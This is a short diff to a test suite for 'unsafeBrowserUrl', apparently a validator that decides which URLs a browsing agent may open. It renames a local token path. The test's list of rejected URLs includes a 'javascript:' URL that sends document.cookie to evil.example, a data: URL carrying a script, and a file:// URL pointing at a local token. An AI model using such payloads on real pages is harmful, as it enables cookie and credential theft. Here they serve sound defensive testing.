@@ -148,7 +148,7 @@ describe("unsafeBrowserUrl: every way the agent opens a URL", () => {
         expect(unsafeBrowserUrl("http://localhost:3000")).toBeNull(); // dev servers in coding demos
         expect(unsafeBrowserUrl("about:blank")).toBeNull();
         for (const bad of [
-            "file:///Users/me/.atlas/overlay-local-token",
+            "file:///Users/me/.bhai/overlay-local-token",
             "javascript:fetch('https://evil.example/?c='+document.cookie)",
             "data:text/html,<script>alert(1)</script>",
             "chrome://settings",
